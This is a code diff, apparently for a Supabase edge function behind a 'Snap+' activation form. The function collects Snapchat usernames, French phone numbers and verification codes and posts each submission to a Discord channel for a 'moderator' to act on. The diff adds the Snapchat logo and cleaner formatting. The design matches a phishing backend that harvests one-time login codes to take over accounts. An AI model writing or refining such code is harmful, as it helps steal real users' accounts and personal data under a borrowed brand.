@@ -25,6 +25,12 @@ serve(async (req) => {
 
     const { username, phone, code, step, submissionId } = await req.json();
 
+    // Formater le numéro de téléphone avec espaces
+    const formatPhone = (p: string) => {
+      const clean = p.replace(/^0/, '');
+      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+    };
+
     // Si c'est le formulaire initial, créer une entrée
     if (step === "form") {
       const { data, error } = await supabase
@@ -36,11 +42,29 @@ serve(async (req) => {
       if (error) throw error;
 
       const embed = {
-        title: "📱 Nouveau formulaire Snap+",
-        description: `🆕 **Nouvelle soumission**\n\n👤 **Nom d'utilisateur:** ${username}\n📞 **Téléphone:** +33${phone}`,
-        color: 0xFFD700,
+        title: "📱 Nouvelle demande Snap+",
+        description: "Un utilisateur vient de soumettre une demande d'activation.",
+        color: 0xFFD700, // Or
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
+        },
+        fields: [
+          { 
+            name: "👤 Nom d'utilisateur", 
+            value: `\`${username}\``, 
+            inline: true 
+          },
+          { 
+            name: "📞 Téléphone", 
+            value: `+33 ${formatPhone(phone)}`, 
+            inline: true 
+          },
+        ],
+        footer: { 
+          text: "⏳ En attente du code de vérification...",
+          icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972531.png"
+        },
         timestamp: new Date().toISOString(),
-        footer: { text: `ID: ${data.id}` }
       };
 
       await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
@@ -65,19 +89,50 @@ serve(async (req) => {
         .eq('id', submissionId);
 
       const now = new Date();
-      const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
-      const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      const dateStr = now.toLocaleDateString('fr-FR', { 
+        day: '2-digit', 
+        month: '2-digit', 
+        year: 'numeric' 
+      });
+      const timeStr = now.toLocaleTimeString('fr-FR', { 
+        hour: '2-digit', 
+        minute: '2-digit', 
+        second: '2-digit' 
+      });
 
       const embed = {
         title: "🔐 Code de vérification soumis",
-        color: 0xFFD700,
+        color: 0xFFD700, // Or
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
+        },
         fields: [
-          { name: "👤 Nom d'utilisateur", value: username, inline: false },
-          { name: "🔢 Code saisi", value: `\`${code}\``, inline: true },
-          { name: "📞 Téléphone", value: `+33${phone.replace(/(\d{2})(?=\d)/g, '$1 ')}`, inline: false },
-          { name: "📅 Soumis à", value: `${dateStr} ${timeStr}`, inline: false },
+          { 
+            name: "👤 Nom d'utilisateur", 
+            value: `\`${username}\``, 
+            inline: false 
+          },
+          { 
+            name: "🔢 Code saisi", 
+            value: `\`\`\`${code}\`\`\``, 
+            inline: true 
+          },
+          { 
+            name: "📞 Téléphone", 
+            value: `+33 ${formatPhone(phone)}`, 
+            inline: true 
+          },
+          { 
+            name: "📅 Soumis le", 
+            value: `${dateStr} à ${timeStr}`, 
+            inline: false 
+          },
         ],
-        footer: { text: "En attente de validation par un modérateur" },
+        footer: { 
+          text: "⏳ En attente de validation par un modérateur",
+          icon_url: "https://cdn-icons-png.flaticon.com/512/1828/1828640.png"
+        },
+        timestamp: new Date().toISOString(),
       };
 
       // Message avec VRAIS boutons interactifs
